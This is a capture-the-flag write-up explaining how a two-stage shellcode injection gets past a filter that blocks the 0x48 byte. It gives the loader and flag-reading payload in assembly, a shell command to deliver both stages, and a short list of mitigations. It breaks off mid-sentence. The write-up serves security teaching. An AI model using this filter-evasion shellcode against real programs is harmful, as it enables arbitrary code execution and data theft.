# Write-up: Multi-Stage Shellcode Injection Bypassing Byte Filter

## Challenge Overview

**Challenge Name**: Ello-Ackers (Shellcode Injection with Byte Filter)  
**Category**: Binary Exploitation / Shellcoding  
**Difficulty**: Intermediate  
**Key Technique**: Multi-Stage Shellcode Injection

## Challenge Description

This challenge presents a classic code injection scenario with a twist: a strict byte filter that prevents the use of shellcode containing the byte `0x48` (ASCII 'H'). The program:

1. Allocates RWX memory at a fixed address (`0x29e93000`)
2. Reads 0x1000 bytes of shellcode from stdin
3. Scans the entire shellcode for forbidden `0x48` bytes
4. Executes the shellcode if it passes the filter
5. Implements additional hardening (closes high FDs, clears environment)

## The Vulnerability

The vulnerability is a **classic code injection** flaw: the program reads user input directly into executable memory and jumps to it. However, the byte filter presents a significant constraint for attackers.

### Why `0x48` is Problematic

The byte `0x48` is the **REX.W prefix** in x86-64 architecture, which is required for most 64-bit register operations. This means:
- Standard 64-bit shellcode (using `rax`, `rbx`, etc.) is blocked
- Common instructions like `xor rax, rax` (`48 31 c0`) are forbidden
- Even string data containing 'H' characters is blocked

## The Solution: Multi-Stage Shellcode Injection

### Concept

The core insight is that the **filter only applies to the initial 0x1000 bytes read**. Once execution begins, we can read additional code that bypasses the filter constraints.

### Stage 1: The Loader (Filter-Compliant)

**Requirements**: Must contain no `0x48` bytes
**Techniques Used**:
- 32-bit register operations (`eax`, `ebx` instead of `rax`, `rbx`)
- Alternative instruction sequences
- Careful avoidance of REX prefixes

```asm
_start:
    xor eax, eax        ; sys_read = 0 (no 0x48)
    xor edi, edi        ; fd = stdin (no 0x48)  
    mov esi, 0x29e93100 ; destination for stage2
    mov edx, 0xF00      ; size
    syscall             ; BLOCKS waiting for stage2
    mov eax, 0x29e93100 ; load stage2 address
    jmp eax             ; jump to stage2
```

**Key Property**: This stage is designed to be entirely free of `0x48` bytes while still being functional.

### Stage 2: The Payload (Unrestricted)

**Advantage**: Loaded after the filter check, so can use any instructions
**Capabilities**: Full 64-bit shellcode with standard techniques

```asm
_start:
    ; Open /flag
    xor rax, rax        ; Now allowed (contains 0x48)
    push rax
    mov rbx, 0x67616c662f2f2f2f
    push rbx
    mov rdi, rsp
    mov al, 2
    xor rsi, rsi
    syscall
    
    ; Read file and output to stdout
    mov rdi, rax
    mov rsi, rsp
    mov dl, 0x40
    xor eax, eax
    syscall
    
    mov edi, 1
    mov eax, 1
    syscall
```

## Execution Flow

1. **Initialization**: Program allocates RWX memory at `0x29e93000`
2. **Stage1 Loading**: First 0x1000 bytes (Stage1 + padding) are read into memory
3. **Filter Check**: Entire buffer scanned for `0x48` bytes â†’ **PASSES**
4. **Stage1 Execution**: Loader executes and blocks at `sys_read()` waiting for input
5. **Stage2 Transmission**: Attacker sends Stage2 through the same stdin pipe
6. **Stage2 Loading**: `sys_read()` completes, loading Stage2 into memory
7. **Stage2 Execution**: Loader jumps to Stage2, which executes unrestricted
8. **Flag Extraction**: Stage2 opens `/flag`, reads it, and prints to stdout

## Exploitation Technique

### Command Sequence
```bash
# Stage1 executes and blocks, then Stage2 is sent
(cat stage1_shellcode; sleep 1; cat stage2_shellcode) | ./binary
```

### Why This Works
- **Timing Separation**: The `sleep` ensures Stage1 is executing before Stage2 is sent
- **Blocking Read**: `sys_read()` in Stage1 blocks the process, preventing race conditions
- **Pipe Behavior**: Unix pipes maintain order and proper buffering

## Defense Implications

### Why This Bypass Works
The filter implementation has a fundamental flaw: it only checks the **initial input**, not subsequent data read during execution. This is a common mistake in input validation systems.

### Proper Mitigations
1. **Continuous Filtering**: Scan all executed code, not just initial input
2. **Syscall Filtering**: Restrict allowed syscalls (e.g., block `read` after initial load)
3. **Execution Monitoring**: Detect code modification during runtime
4. **Smaller Memory Regions**: Reduce the available space for multi-stage payloads

## Key Takeaways

1. **Filter Evasion**: Byte filters can often be bypassed with multi-stage approaches
2. **Timing Attacks**: Execution timing can be exploited to separate filtered/unfiltered code
3. **Architecture Knowledge**: Understanding x86-64 instruction encoding is crucial
4. **Input Validation**: Security checks must consider the entire execution lifecycle, not just initial input

## Conclusion

This challenge demonstrates a classic pattern in exploitation: when direct approaches are blocked, **indirection and staging** often provide a path forward. The multi-stage shellcode technique is powerful because it turns the program's own functionality (the ability to read more input) against its security meas
